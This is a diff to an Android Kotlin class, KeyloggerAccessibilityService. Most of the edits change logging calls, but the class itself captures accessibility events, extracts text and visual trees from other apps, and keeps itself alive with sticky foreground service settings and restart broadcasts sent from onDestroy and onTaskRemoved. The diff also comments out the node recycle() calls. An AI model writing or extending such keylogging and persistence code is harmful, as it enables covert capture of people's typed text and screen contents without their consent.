@@ -44,7 +44,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
     private var lastBleDevicesSeen = 0
     private var lastWakeSource = "unknown"
     private var serviceStartTime = 0L
-
+    private val TAG: String = "KeyloggerAccessibilityService"
     private var healthCheckRunnable: Runnable? = null
 
     inner class LocalBinder : Binder() {
@@ -66,14 +66,14 @@ class KeyloggerAccessibilityService : AccessibilityService() {
 
     override fun onCreate() {
         super.onCreate()
-        Timber.d("AccessibilityService created")
+        Timber.tag(TAG).d("AccessibilityService created")
         serviceInstance = this
         isRunning = true
         serviceStartTime = System.currentTimeMillis()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Timber.d("onStartCommand - action: ${intent?.action}, startId: $startId")
+        Timber.tag(TAG).d("onStartCommand - action: ${intent?.action}, startId: $startId")
 
         // Get wake source if provided
         lastWakeSource = intent?.getStringExtra("wake_trigger") ?: "direct_start"
@@ -81,7 +81,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
         // Start as foreground service with proper type
         startForegroundWithType()
 
-        // Start health monitoring
+        // Start monitoring
         startServiceMonitoring()
 
         // Return START_STICKY to request restart if killed
@@ -89,7 +89,8 @@ class KeyloggerAccessibilityService : AccessibilityService() {
     }
 
     /**
-     * Start foreground service with correct type for Android 14+
+     * Start foreground service with correct type connectedDevice for Android 14+
+     * the type connectedDevice is perfect for BLE/Bluetooth operations
      */
     private fun startForegroundWithType() {
         val notification = createNotification()
@@ -113,7 +114,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
             // Android 9 and below
             startForeground(NOTIFICATION_ID, notification)
         }
-        Timber.d("Foreground service started with connectedDevice type")
+        Timber.tag(TAG).d("Foreground service started with connectedDevice type")
     }
 
     /**
@@ -121,7 +122,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
      * Uses BatteryConfig for service check interval.
      */
     private fun startServiceMonitoring() {
-        Timber.Forest.d("Start monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")
+        Timber.tag(TAG).d("Start monitoring (interval: ${BatteryConfig.servicePersistenceCheckMs / 1000}s)...")
 
         // Remove any existing runnable
         healthCheckRunnable?.let { handler.removeCallbacks(it) }
@@ -216,7 +217,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        Timber.Forest.d("AccessibilityService connected")
+        Timber.tag(TAG).d("AccessibilityService connected")
 
         // Configure service info
         configureServiceInfo()
@@ -231,7 +232,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
         }
 
         isRunning = true
-        Timber.Forest.d("AccessibilityService is now running")
+        Timber.tag(TAG).d("AccessibilityService is now running")
     }
 
     private fun configureServiceInfo() {
@@ -270,7 +271,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
             startForeground(NOTIFICATION_ID, notification)
         }
 
-        Timber.Forest.d("Started as foreground service")
+        Timber.tag(TAG).d("Started as foreground service")
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -288,7 +289,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
                     AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> handleContentChanged(event)
                 }
             } catch (e: Exception) {
-                Timber.Forest.e(e, "Error processing event")
+                Timber.tag(TAG).e(e, "Error processing event")
             }
         }
     }
@@ -332,7 +333,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
 
         eventProcessor.processEvent(capturedEvent)
         visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
-        source.recycle()
+        // source.recycle()
     }
 
     private suspend fun handleWindowStateChanged(event: AccessibilityEvent) {
@@ -363,7 +364,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
 
         eventProcessor.processEvent(capturedEvent)
         visualTreeCapture.captureVisualTree(event.source!!, event.packageName as String)
-        source.recycle()
+        // source.recycle()
     }
 
     private suspend fun handleContentChanged(event: AccessibilityEvent) {
@@ -375,7 +376,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
         val source = event.source
         if (source != null) {
             extractTextFromNodeTree(source)
-            source.recycle()
+            // source.recycle()
         }
     }
 
@@ -408,7 +409,7 @@ class KeyloggerAccessibilityService : AccessibilityService() {
                 }
             }
         } catch (e: Exception) {
-            Timber.Forest.e(e, "Error extracting text from node")
+            Timber.tag(TAG).e(e, "Error extracting text from node")
         }
     }
 
@@ -421,27 +422,34 @@ class KeyloggerAccessibilityService : AccessibilityService() {
     }
 
     override fun onInterrupt() {
-        Timber.Forest.w("AccessibilityService interrupted")
-    }
-
-    override fun onTaskRemoved(rootIntent: Intent?) {
-
-        // Trigger restart
-        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
-
-        super.onTaskRemoved(rootIntent)
+        Timber.tag(TAG).w("AccessibilityService interrupted")
     }
 
     override fun onDestroy() {
+        Timber.tag(TAG).d("═══════════════════════════════════════")
+        Timber.tag(TAG).d("KeyloggerAccessibilityService onDestroy")
+
         isRunning = false
         serviceInstance = null
         handler.removeCallbacksAndMessages(null)
 
         // Trigger restart via broadcast
+        Timber.tag(TAG).d("Sending restart broadcast...")
         sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
+
+        Timber.tag(TAG).d("Service destroyed - restart triggered")
+        Timber.tag(TAG).d("═══════════════════════════════════════")
 
         serviceScope.cancel()
         super.onDestroy()
-        Timber.d("AccessibilityService destroyed")
+    }
+
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        Timber.tag(TAG).d("onTaskRemoved - app swiped from recents")
+
+        // Trigger restart
+        sendBroadcast(Intent(this, ServiceRestartReceiver::class.java))
+
+        super.onTaskRemoved(rootIntent)
     }
 }
